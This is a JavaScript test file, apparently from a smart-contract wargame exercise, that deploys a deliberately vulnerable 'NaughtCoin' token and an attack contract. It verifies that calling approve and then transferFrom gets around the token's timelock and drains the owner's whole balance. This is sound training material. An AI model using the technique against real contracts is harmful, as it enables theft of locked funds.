// test/Privacy.test.js

// load dependencies
const { expect } = require('chai');

// import utils from test helpers
const { BN, expectEvent, expectRevert } = require('@openzeppelin/test-helpers');
const { ethers } = require('hardhat');

// load compiled artifacts
const NaughtCoin       = artifacts.require('NaughtCoin');
const NaughtCoinAttack = artifacts.require('NaughtCoinAttack');

// start test block
contract('NaughtCoin', function ([ owner, other ]) {

  beforeEach(async function () {
    this.vulnContract   = await NaughtCoin.new(owner, { from: owner });
    this.attackContract = await NaughtCoinAttack.new(this.vulnContract.address, {from: other});
  });

  it('test attack: use approve & transferFrom to get around timelock & withdraw tokens', async function () {
    const initialSupply = BN("1000000000000000000000000");

    // check owner initially owns all tokens
    expect(await this.vulnContract.balanceOf(owner)).to.be.bignumber.equal(initialSupply);

    // approve our attack contract as a spender
    await this.vulnContract.approve(this.attackContract.address, initialSupply);

    // call the attack contract
    await this.attackContract.attack();

    // check that attack contract now owns all the balance
    expect(await this.vulnContract.balanceOf(this.attackContract.address)).to.be.bignumber.equal(initialSupply);
    // and that owner contract is 0
    expect(await this.vulnContract.balanceOf(owner)).to.be.bignumber.equal(BN("0"));
  });
});
